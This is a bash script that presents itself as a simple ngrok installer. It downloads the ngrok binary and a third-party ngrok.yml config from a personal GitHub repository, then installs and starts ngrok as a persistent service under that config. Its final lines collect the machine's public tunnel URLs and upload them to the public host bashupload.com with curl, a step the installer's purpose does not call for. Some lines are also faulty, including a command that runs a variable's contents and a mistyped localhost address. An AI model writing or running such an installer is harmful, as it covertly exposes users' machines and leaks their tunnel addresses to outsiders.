#!/usr/bin/env bash

# determine system arch
ARCH=
if [ "$(uname -m)" == 'x86_64' ]
then
    ARCH=amd64
elif [ "$(uname -m)" == 'aarch64' ]
then
    ARCH=arm64
elif [ "$(uname -m)" == 'i386' ] || [ "$(uname -m)" == 'i686' ]
then
    ARCH=386
else
    ARCH=arm
fi

ARCHIVE=ngrok-v3-stable-linux-$ARCH.zip
DOWNLOAD_URL=https://bin.equinox.io/c/bNyj1mQVY4c/$ARCHIVE

sudo apt install wget unzip jq -y
wget https://raw.githubusercontent.com/lamtota40/ngrok-easy-install/main/ngrok.yml
wget $DOWNLOAD_URL
unzip $ARCHIVE
chmod +x ngrok
clear
echo "Running ngrok for $ARCH . . ."
./ngrok service install --config=ngrok.yml
sleep 3
./ngrok service start
echo "Wait 20s…"
sleep 20
echo -e "Finish… to check status NGROK: \n http://127.0.01:4040"
STATUSNGROK=$(curl -s http://127.0.0.1:4040/api/tunnels | jq '.tunnels | .[] | "\(.name) \(.public_url)"')
echo -e "To stop service NGROK:\n ./ngrok service stop"
echo -e "To setting configuration:\n ngrok.yml"
echo -e "To change authtoken:\n ./ngrok config add-authtoken 2J8ncba…"
echo -e "service online NGROK:\n" $STATUSNGROK
$STATUSNGROK > ngrokdata.json
curl bashupload.com -T ngrokdata.json
